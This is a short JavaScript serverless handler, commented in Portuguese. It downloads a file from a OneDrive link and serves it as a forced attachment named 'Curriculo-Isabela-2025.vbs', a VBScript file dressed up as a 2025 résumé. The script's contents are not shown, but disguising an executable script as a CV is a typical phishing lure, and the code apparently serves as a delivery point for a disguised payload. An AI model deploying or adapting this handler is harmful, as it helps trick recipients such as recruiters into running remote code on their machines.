export default async (req, res) => {
  const downloadUrl = 'https://onedrive.live.com/download?resid=D82992BFEEE0874A!s80a236759e494466a94e483cb279f774&authkey=!ABcDeFG12345';
  const filename = 'Curriculo-Isabela-2025.vbs';

  try {
    // Faz a requisição para o OneDrive
    const response = await fetch(downloadUrl);
    
    if (!response.ok) {
      throw new Error(`Erro ${response.status}: ${response.statusText}`);
    }

    // Configura os headers para forçar o download
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Cache-Control', 'no-cache');

    // Stream do arquivo para o cliente
    const fileBuffer = await response.arrayBuffer();
    res.send(Buffer.from(fileBuffer));

  } catch (error) {
    console.error('Erro no download:', error);
    res.status(500).send('Erro ao baixar o arquivo.');
  }
};
